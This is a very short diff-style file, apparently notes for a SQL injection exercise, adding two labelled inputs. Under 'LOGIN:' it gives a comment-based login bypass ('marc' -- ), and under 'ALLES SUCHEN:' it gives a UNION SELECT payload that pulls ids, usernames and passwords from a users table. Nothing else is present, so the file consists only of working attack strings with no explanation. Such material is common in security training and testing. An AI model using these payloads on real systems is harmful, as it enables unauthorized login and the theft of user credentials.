@@ -1,2 +1,5 @@
+LOGIN:
 marc' -- 
 
+ALLES SUCHEN:
+%' UNION SELECT id, username, password FROM users; #
